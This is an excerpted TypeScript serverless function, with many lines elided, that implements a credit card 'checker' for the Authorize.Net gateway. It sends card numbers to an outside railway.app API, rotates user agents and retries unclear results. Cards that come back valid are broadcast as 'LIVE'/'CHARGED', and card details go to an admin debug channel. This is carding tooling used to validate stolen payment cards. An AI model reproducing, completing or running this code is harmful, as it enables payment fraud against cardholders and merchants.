...
const notifyChargedCard = (
  ...
  }).catch((err) => console.error("[AUTHNET-AUTH] notify-charged-card error:", err));
};
...
const sendAdminDebug = (cardDetails: string, rawResponse: string) => {
  ...
  const message = `🔍 <b>AuthNet Auth Debug</b>\n\n` +
  ...
  }).catch((err) => console.error("[AUTHNET-AUTH] admin debug error:", err));
};
...
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 3;
  const apiUrl = `https://auth-production-17c5.up.railway.app/api/cc=${cc}`;
  ...
  try {
    ...
    console.log(`[AUTHNET-AUTH] Attempt ${attempt} - Raw response:`, rawText.substring(0, 500));
    ...
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[AUTHNET-AUTH] UNKNOWN on attempt ${attempt}, retrying...`);
    ...
    console.error(`[AUTHNET-AUTH] Attempt ${attempt} - Fetch error:`, error);
...
serve(async (req) => {
  ...
  try {
    ...
    console.log('[AUTHNET-AUTH] Checking card for user:', user.id);

    const data = await performCheck(cc, getRandomUserAgent());

    // Broadcast LIVE cards
    if (data.computedStatus === 'live') {
      notifyChargedCard(user.id, cc, 'CHARGED', String(data.apiMessage || 'LIVE'), '$0.00', 'AuthNet Auth');
    }
    ...
    console.error('[AUTHNET-AUTH] Error:', errorMessage);
